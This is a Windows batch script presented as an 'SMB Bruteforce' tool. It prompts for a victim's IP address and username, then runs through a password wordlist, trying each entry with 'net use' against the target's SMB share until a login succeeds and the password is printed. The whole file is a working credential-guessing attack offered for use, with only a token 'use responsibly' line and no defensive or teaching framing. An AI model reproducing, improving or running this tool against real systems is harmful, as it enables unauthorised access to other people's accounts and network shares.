@echo off
title SMB Bruteforce
color A
echo.
echo This is a bruteforce tool for connecting to IP's
echo Please Use this responsibly
echo You do need to know the IP and the username you want to attack
pause

set /p ip="Enter Victim IP Address: "
set /p user="Enter Victim Username: "

:: Check if BBFD.txt exists in the current directory
if exist "BBFD.txt" (
    set "wordlist=BBFD.txt"
) else (
    :: If BBFD.txt does not exist, use PowerShell to open a file dialog for selecting the password list file
    echo Select the password list file:
    for /f "delims=" %%I in ('powershell -Command "Add-Type -AssemblyName System.windows.forms; $f = new-object System.Windows.Forms.OpenFileDialog; $f.InitialDirectory = [Environment]::GetFolderPath('Desktop'); $f.Filter = 'Text Files (*.txt)|*.txt'; $f.ShowDialog() | Out-Null; $f.FileName"') do set "wordlist=%%I"
)

if not exist "%wordlist%" (
    echo Error: File not found. Please select a valid file.
    pause
    exit
)

set /a count=1
for /f "delims=" %%a in (%wordlist%) do (
    call :attempt "%%a"
)

echo Password Not Found!
pause
exit

:success
echo.
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
set "pass=%~1"
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempting password: %pass%
if %errorlevel% EQU 0 goto success
